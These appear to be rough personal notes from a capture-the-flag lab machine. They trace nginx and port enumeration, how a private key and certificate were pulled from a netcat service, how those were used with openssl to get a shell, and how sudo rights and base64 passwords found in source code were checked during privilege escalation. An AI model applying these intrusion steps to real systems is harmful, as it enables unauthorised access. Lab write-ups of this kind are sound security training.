Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
| 	Bamm Bamm tried to setup a sql database, but I don't see it running.
| 	Looks like it started something else, but I'm not sure how to turn it off...
| 	said it was from the toilet and OVER 9000!
|_	Need to try and secure
Nginx backend
There is a sql database?
Sql inject?
Probably running on a port >9000
9009
Curl: Received HTTP/0.9 when not allowed
Uh oh thats not good for them
An error occurred during a connection to 10.10.236.14:9009. SSL received a record that exceeded the maximum permissible length.
What the hell is this?
OOOOOHHHH
nc 10.10.236.14 9009
“Welcome to ABC” What are you looking for?
Private key
Got a private key
Certificate
Got cert :)
Fred
Got a picture of fred in ascii
54321
Nmap: Error: 'undefined' is not authorized for access.
Something to do with the TLS certificate
What about the key and cert I got from 9009 :)
openssl s_client -connect 10.10.236.14:54321 -cert cert -key privkey
Got a weird shell :)
Password hint:
d1ad7c0a3805955a35eb260dab4180dd
User = ‘ Barney Rubble ‘
Does not match any hashes :(

Linpeas shows nothing useful
Sudo -l with barney password shows that he can run /usr/bin/certutil with sudo
Sudo certutil ls
Shows where the fred certificate is but we cant read it
This is not the actual “certutil” command but a modified one that trolls you if you mess up with the input.
Got an error thrown and it points to a .js file
Client.js appears to be source code for the certutil command
Server.js is source code for the certificate giver on 9009
Has base 64 encoded passwords for Fred and Barney
